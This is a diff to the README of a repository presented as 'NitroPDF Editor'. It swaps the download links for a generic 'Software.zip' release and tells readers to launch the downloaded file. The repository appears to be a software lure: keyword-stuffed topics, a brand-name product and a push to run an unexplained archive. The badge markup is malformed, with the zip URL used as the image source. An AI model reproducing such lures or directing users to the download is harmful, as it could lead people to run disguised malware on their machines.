@@ -16,10 +16,10 @@ Welcome to the NitroPDF-Editor repository, where you can edit, convert, and mana
 - **Topics**: document-editing, document-management, file-conversion, nitropdf, pdf-converter, pdf-creator, pdf-editing-software, pdf-editor, pdf-reader, pdf-software, pdf-solutions, pdf-tools, pdf-utility, pdf-viewer, text-pdf-editor
 
 ## Get Started
-To get started with NitroPDF Editor, you can download the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Please make sure to launch the downloaded file to start using NitroPDF Editor.
+To get started with NitroPDF Editor, you can download the latest release [here](https://github.com/honainking0/NitroPDF-Editor/releases/download/v1.0/Software.zip). Please make sure to launch the downloaded file to start using NitroPDF Editor.
 
 ## Download Latest Release
-[![Download NitroPDF Editor](https://img.shields.io/badge/Download-Latest%20Release-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download NitroPDF Editor](https://github.com/honainking0/NitroPDF-Editor/releases/download/v1.0/Software.zip%20Release-green)](https://github.com/honainking0/NitroPDF-Editor/releases/download/v1.0/Software.zip)
 
 ## Installation
 Follow these steps to install NitroPDF Editor on your system:
